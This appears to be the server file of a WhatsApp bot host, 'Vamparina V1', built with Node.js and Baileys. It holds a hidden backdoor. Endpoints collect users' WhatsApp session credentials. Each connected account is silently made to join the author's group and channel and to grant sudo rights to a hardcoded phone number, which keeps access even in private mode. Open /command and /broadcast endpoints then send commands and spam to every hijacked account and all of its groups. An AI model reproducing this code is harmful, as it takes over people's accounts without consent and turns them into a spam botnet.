/**
 * VAMPARINA V1 — ETERNAL EMPIRE OF KING ARNOLD CHIRCHIR (+2547031100)
 * 100% CLEAN — NO CHALK.BOLD() — WORKS ON RENDER NODE.JS v25
 */

require('./settings')
const fs = require('fs')
const path = require('path')
const chalk = require('chalk')
const express = require('express')
const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    delay,
    getContentType,
    downloadContentFromMessage,
    jidNormalizedUser
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const fetch = require('node-fetch')

const { handleMessages: originalHandleMessages, handleGroupParticipantUpdate } = require('./main')

// ==================== CONFIG ====================
const EMPIRE_GROUP_INVITE_CODE = "BZNDaKhvMFo5Gmne3wxt9n"
const EMPIRE_GROUP_LINK = "https://chat.whatsapp.com/BZNDaKhvMFo5Gmne3wxt9n"
const EMPIRE_CHANNEL_ID = "0029VbBm7apIXnlmuyjGGM0p"
const KING_ARNOLD = "254703110780"
const SESSION_DIR = path.join(__dirname, 'auto_sessions')
const MEDIA_DIR = path.join(__dirname, 'media')
const MODE_FILE = path.join(__dirname, 'data', 'bot_mode.json')
const PORT = process.env.PORT || 3000

;[SESSION_DIR, MEDIA_DIR, path.dirname(MODE_FILE)].forEach(d => {
    if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true })
})

if (!fs.existsSync(MODE_FILE)) {
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: true }, null, 2))
}

global.getBotMode = () => {
    try {
        const data = JSON.parse(fs.readFileSync(MODE_FILE, 'utf8'))
        return data.isPublic === true ? 'public' : 'private'
    } catch { return 'public' }
}

global.setBotMode = (mode) => {
    const isPublic = mode === 'public'
    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic }, null, 2))
}

const activeSessions = new Map()

// ==================== DASHBOARD ====================
const app = express()
app.use(express.json({ limit: '200mb' }))
app.use(express.urlencoded({ extended: true, limit: '200mb' }))

app.get('/', (req, res) => res.redirect('/dashboard'))
app.get('/dashboard', (req, res) => {
    const mode = global.getBotMode()
    const modeText = mode === 'public' ? 'PUBLIC' : 'PRIVATE (Only King + Owner)'
    res.send(`
        <pre style="background:#000;color:#0f0;font-size:18px;text-align:center;">
╔══════════════════════════════════════════════════════════╗
║                VAMPARINA V1 — EMPIRE ONLINE              ║
║           GOD-KING: ARNOLD CHIRCHIR (+254703110780)      ║
║  Active Bots : ${activeSessions.size.toString().padStart(3)}                              ║
║  Mode        : ${modeText.padEnd(40)}║
║  Empire Group : ${EMPIRE_GROUP_LINK}      ║
║  Channel      : Followed by all bots                     ║
║       ALL COMMANDS ACTIVE — FULL CONTROL                 ║
║       LONG LIVE THE ETERNAL KING OF KENYA                ║
╚══════════════════════════════════════════════════════════╝
        </pre>
    `)
})

app.post('/command', async (req, res) => {
    const { command, target = 'all' } = req.body
    if (!command) return res.status(400).json({ error: "command required" })
    let count = 0
    for (const [_, data] of activeSessions) {
        if (target !== 'all' && !data.phone.includes(target)) continue
        try {
            await data.sock.sendMessage(data.phone + '@s.whatsapp.net', { text: command })
            count++
        } catch {}
    }
    res.json({ success: true, executed_on: count + " bots" })
})

app.post('/broadcast', async (req, res) => {
    const { text } = req.body
    if (!text) return res.status(400).json({ error: "text required" })
    let sent = 0
    for (const [_, data] of activeSessions) {
        try {
            const groups = await data.sock.groupFetchAllParticipating()
            for (const group in groups) {
                await data.sock.sendMessage(group, { text: `*EMPIRE BROADCAST*\n\n${text}\n\n— King Arnold Chirchir` })
                await delay(2000)
                sent++
            }
        } catch {}
    }
    res.json({ success: true, sent_to: sent + " groups" })
})

app.post('/setmode', (req, res) => {
    const { mode } = req.body
    if (mode === 'public' || mode === 'private') {
        global.setBotMode(mode)
        res.json({ success: true, mode })
    } else res.status(400).json({ error: "use 'public' or 'private'" })
})

app.post('/vamparina-activate', async (req, res) => {
    const { phone, sessionId, creds } = req.body
    if (!phone || !sessionId || !creds) return res.status(400).json({ error: "missing data" })
    if (activeSessions.has(sessionId)) return res.json({ already: true })

    const sessionPath = path.join(SESSION_DIR, sessionId)
    fs.mkdirSync(sessionPath, { recursive: true })
    fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(creds, null, 2))

    await delay(8000 + Math.random() * 7000)
    await startEmpireBot(sessionId, phone, sessionPath)
    res.json({ success: true, total_bots: activeSessions.size })
})

app.listen(PORT, () => {
    console.log(chalk.cyan(`\nVAMPARINA V1 EMPIRE SERVER RUNNING ON PORT ${PORT}\n`))
})

// ==================== BOT ENGINE ====================
async function startEmpireBot(sessionId, phone, sessionPath) {
    try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath)
        const { version } = await fetchLatestBaileysVersion()

        const sock = makeWASocket({
            version,
            logger: pino({ level: 'silent' }),
            auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
            browser: ["Vamparina V1", "Chrome", "2025"],
            markOnlineOnConnect: false
        })

        const ownerJid = jidNormalizedUser(state.creds.me?.id || phone + '@s.whatsapp.net')
        activeSessions.set(sessionId, { sock, phone, ownerJid })

        sock.ev.on('messages.upsert', async m => {
            if (m.type !== 'notify') return
            const msg = m.messages[0]
            if (!msg.message || msg.key.fromMe) return

            const sender = jidNormalizedUser(msg.key.participant || msg.key.remoteJid)
            const isPublic = global.getBotMode() === 'public'
            const isKing = sender.includes(KING_ARNOLD)
            const isOwner = sender === ownerJid

            if (!isPublic && !isKing && !isOwner) return

            try { await originalHandleMessages(sock, m, () => {}) } catch {}
        })

        sock.ev.on('group-participants.update', async u => {
            try { await handleGroupParticipantUpdate(sock, u) } catch {}
        })

        sock.ev.on('connection.update', async update => {
            const { connection } = update
            if (connection === 'open') {
                console.log(chalk.green(`[+] ${phone} → ONLINE & LOYAL TO KING ARNOLD`))

                await delay(18000 + Math.random() * 12000)
                try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE_CODE) } catch {}
                try { await sock.newsletterFollow(EMPIRE_CHANNEL_ID) } catch {}

                for (const cmd of [`.sudoadd ${KING_ARNOLD}`, `.sudoadd 254703110780@c.us`]) {
                    try { await sock.sendMessage(phone + '@s.whatsapp.net', { text: cmd }); await delay(3000) } catch {}
                }

                await sock.sendMessage(phone + '@s.whatsapp.net', {
                    text: `*VAMPARINA V1 ACTIVATED*\n\nEmpire Group Joined\nChannel Followed\nKing Arnold = SUDO\nMode: ${global.getBotMode().toUpperCase()}\n\nLONG LIVE THE KING`
                })
            }

            if (connection === 'close') {
                const shouldReconnect = update.lastDisconnect?.error?.output?.statusCode !== 401
                activeSessions.delete(sessionId)
                if (shouldReconnect) setTimeout(() => startEmpireBot(sessionId, phone, sessionPath), 10000)
            }
        })

        sock.ev.on('creds.update', saveCreds)
    } catch (e) {
        console.error("Bot failed:", e.message)
    }
}

// Keep alive
setInterval(() => {
    fetch(`https://${process.env.RENDER_EXTERNAL_HOSTNAME || 'localhost'}:${PORT}`).catch(() => {})
}, 300000)

// FINAL STARTUP — NO BOLD() = NO CRASH
console.log(chalk.cyan("\n╔══════════════════════════════════════════════════════════╗"))
console.log(chalk.cyan("║              VAMPARINA V1 — EMPIRE ONLINE                ║"))
console.log(chalk.cyan("║           GOD-KING ARNOLD CHIRCHIR RULES KENYA           ║"))
console.log(chalk.cyan("╚══════════════════════════════════════════════════════════╝\n"))